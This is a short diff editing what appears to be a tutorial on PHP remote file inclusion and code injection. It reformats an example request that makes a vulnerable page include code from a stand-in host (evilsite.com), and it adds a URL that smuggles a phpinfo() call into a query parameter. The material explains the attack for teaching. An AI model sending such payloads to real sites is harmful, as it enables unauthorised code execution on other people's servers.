@@ -26,8 +26,9 @@ the attacker may try to execute code other than what the developer had in mind.
 The URL below passes a page name to the include() function. http://testsite.com/index.php?page=contact.php
 
 The file “evilcode.php” may contain, for example, the phpinfo() function which is useful for gaining information about the configuration of the environment in which the web service runs. 
-An attacker can ask the application to execute their PHP code using the following request: http://testsite.com/?page=http://evilsite.com/evilcode.php
-
+An attacker can ask the application to execute their PHP code using the following request: 
+http://testsite.com/?page=http://evilsite.com/evilcode.php
+http://testsite.com/index.php?arg=1; phpinfo()
 
 Example 2
 
